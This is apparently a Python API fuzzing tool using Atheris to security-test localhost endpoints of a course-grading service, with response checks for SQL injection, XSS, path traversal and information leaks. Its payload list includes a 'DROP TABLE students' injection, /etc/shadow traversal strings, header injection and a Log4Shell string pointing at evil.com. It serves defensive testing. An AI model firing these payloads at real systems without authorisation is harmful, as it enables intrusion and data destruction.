#!/usr/bin/env python3
"""
API Fuzzing Tool using Atheris
Fuzz tests API endpoints for security vulnerabilities
"""

import sys
import json
import atheris
import requests
from typing import Dict, List, Any

# Configuration
API_BASE_URL = "http://localhost:8000"  # Adjust as needed
TIMEOUT = 5

# Common API endpoints to fuzz
ENDPOINTS = [
    "/api/v1/submit",
    "/api/v1/grade",
    "/api/v1/feedback",
    "/api/v1/student",
    "/api/v1/course",
    "/api/v1/assignment",
]

# Fuzzing payloads
INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE students;--",
    "<script>alert('XSS')</script>",
    "../../../etc/passwd",
    "%0d%0aSet-Cookie:session=admin",
    "${7*7}",  # Template injection
    "{{7*7}}",
    "../../../../etc/shadow",
    "{{config}}",
    "${jndi:ldap://evil.com/a}",  # Log4shell
]


class APIFuzzer:
    """API Fuzzing Engine"""

    def __init__(self, base_url: str):
        self.base_url = base_url
        self.findings = []
        self.request_count = 0

    def fuzz_endpoint(self, endpoint: str, method: str, data: Any):
        """Fuzz a single endpoint with given data"""
        self.request_count += 1
        url = f"{self.base_url}{endpoint}"

        try:
            if method == "GET":
                response = requests.get(url, params=data, timeout=TIMEOUT)
            elif method == "POST":
                response = requests.post(url, json=data, timeout=TIMEOUT)
            elif method == "PUT":
                response = requests.put(url, json=data, timeout=TIMEOUT)
            elif method == "DELETE":
                response = requests.delete(url, timeout=TIMEOUT)
            else:
                return

            # Check for potential vulnerabilities
            self.analyze_response(endpoint, method, data, response)

        except requests.exceptions.Timeout:
            self.findings.append({
                "severity": "MEDIUM",
                "type": "Timeout",
                "endpoint": endpoint,
                "method": method,
                "data": str(data)[:100],
                "message": "Request timed out - possible DoS vulnerability"
            })
        except requests.exceptions.ConnectionError:
            # Server might be down, skip
            pass
        except Exception as e:
            self.findings.append({
                "severity": "HIGH",
                "type": "Exception",
                "endpoint": endpoint,
                "method": method,
                "data": str(data)[:100],
                "message": f"Unexpected error: {str(e)}"
            })

    def analyze_response(self, endpoint: str, method: str, data: Any, response: requests.Response):
        """Analyze response for security issues"""

        # Check for SQL errors
        sql_errors = [
            "SQL syntax",
            "mysql_fetch",
            "postgresql",
            "ORA-",
            "sqlite3",
            "SQLSTATE",
        ]
        for error in sql_errors:
            if error.lower() in response.text.lower():
                self.findings.append({
                    "severity": "CRITICAL",
                    "type": "SQL Injection",
                    "endpoint": endpoint,
                    "method": method,
                    "data": str(data)[:100],
                    "message": f"Potential SQL injection - {error} in response"
                })

        # Check for reflected input (XSS)
        if isinstance(data, dict):
            for key, value in data.items():
                if isinstance(value, str) and value in response.text:
                    if "<script>" in value.lower() or "onerror=" in value.lower():
                        self.findings.append({
                            "severity": "HIGH",
                            "type": "XSS",
                            "endpoint": endpoint,
                            "method": method,
                            "data": str(data)[:100],
                            "message": f"Potential XSS - input reflected without sanitization"
                        })

        # Check for path traversal success
        if "../" in str(data):
            sensitive_patterns = ["root:", "password:", "[users]", "BEGIN RSA PRIVATE KEY"]
            for pattern in sensitive_patterns:
                if pattern in response.text:
                    self.findings.append({
                        "severity": "CRITICAL",
                        "type": "Path Traversal",
                        "endpoint": endpoint,
                        "method": method,
                        "data": str(data)[:100],
                        "message": f"Successful path traversal - {pattern} found in response"
                    })

        # Check for server errors (500s might leak info)
        if response.status_code >= 500:
            if any(word in response.text.lower() for word in ["traceback", "exception", "error", "stack"]):
                self.findings.append({
                    "severity": "MEDIUM",
                    "type": "Information Disclosure",
                    "endpoint": endpoint,
                    "method": method,
                    "data": str(data)[:100],
                    "message": f"Server error reveals internal details: {response.status_code}"
                })

        # Check for missing security headers
        if response.status_code == 200:
            security_headers = [
                "X-Content-Type-Options",
                "X-Frame-Options",
                "Content-Security-Policy",
                "Strict-Transport-Security"
            ]
            missing_headers = [h for h in security_headers if h not in response.headers]
            if missing_headers and self.request_count == 1:  # Only report once
                self.findings.append({
                    "severity": "LOW",
                    "type": "Missing Security Headers",
                    "endpoint": endpoint,
                    "method": method,
                    "data": "",
                    "message": f"Missing headers: {', '.join(missing_headers)}"
                })

    def generate_report(self):
        """Generate fuzzing report"""
        print("\n" + "=" * 60)
        print("API FUZZING REPORT")
        print("=" * 60)
        print(f"Total Requests: {self.request_count}")
        print(f"Findings: {len(self.findings)}")
        print("=" * 60)

        # Group by severity
        by_severity = {"CRITICAL": [], "HIGH": [], "MEDIUM": [], "LOW": []}
        for finding in self.findings:
            by_severity[finding["severity"]].append(finding)

        for severity in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
            if by_severity[severity]:
                print(f"\n{severity} SEVERITY ({len(by_severity[severity])})")
                print("-" * 60)
                for finding in by_severity[severity]:
                    print(f"Type: {finding['type']}")
                    print(f"Endpoint: {finding['method']} {finding['endpoint']}")
                    print(f"Message: {finding['message']}")
                    if finding['data']:
                        print(f"Payload: {finding['data']}")
                    print()

        # Save to JSON
        with open("/tmp/api_fuzz_report.json", "w") as f:
            json.dump({
                "total_requests": self.request_count,
                "findings": self.findings
            }, f, indent=2)

        print("=" * 60)
        print("Report saved to: /tmp/api_fuzz_report.json")
        print("=" * 60)

        # Exit with error if critical/high findings
        if by_severity["CRITICAL"] or by_severity["HIGH"]:
            sys.exit(1)


# Global fuzzer instance
fuzzer = APIFuzzer(API_BASE_URL)


@atheris.instrument_func
def TestOneInput(data):
    """Atheris fuzzing entry point"""
    fdp = atheris.FuzzedDataProvider(data)

    # Generate fuzzed request
    endpoint = fdp.PickValueInList(ENDPOINTS)
    method = fdp.PickValueInList(["GET", "POST", "PUT", "DELETE"])

    # Generate fuzzed payload
    payload_type = fdp.ConsumeIntInRange(0, 3)

    if payload_type == 0:
        # Injection payloads
        payload = {
            "id": fdp.PickValueInList(INJECTION_PAYLOADS),
            "data": fdp.PickValueInList(INJECTION_PAYLOADS)
        }
    elif payload_type == 1:
        # Random strings
        payload = {
            "field1": fdp.ConsumeString(100),
            "field2": fdp.ConsumeString(100)
        }
    elif payload_type == 2:
        # Large payloads (DoS test)
        payload = {
            "data": "A" * fdp.ConsumeIntInRange(1000, 100000)
        }
    else:
        # Malformed JSON-like structures
        payload = {
            "nested": {
                "deep": {
                    "data": fdp.ConsumeString(50)
                }
            }
        }

    fuzzer.fuzz_endpoint(endpoint, method, payload)


def main():
    """Main fuzzing entry point"""
    if len(sys.argv) > 1 and sys.argv[1] == "--manual":
        # Manual fuzzing mode
        print("Running manual fuzzing tests...")

        for endpoint in ENDPOINTS:
            for method in ["GET", "POST"]:
                # Test with injection payloads
                for payload in INJECTION_PAYLOADS:
                    test_data = {"input": payload, "id": payload}
                    fuzzer.fuzz_endpoint(endpoint, method, test_data)

        fuzzer.generate_report()
    else:
        # Atheris fuzzing mode
        atheris.Setup(sys.argv, TestOneInput)
        atheris.Fuzz()


if __name__ == "__main__":
    main()
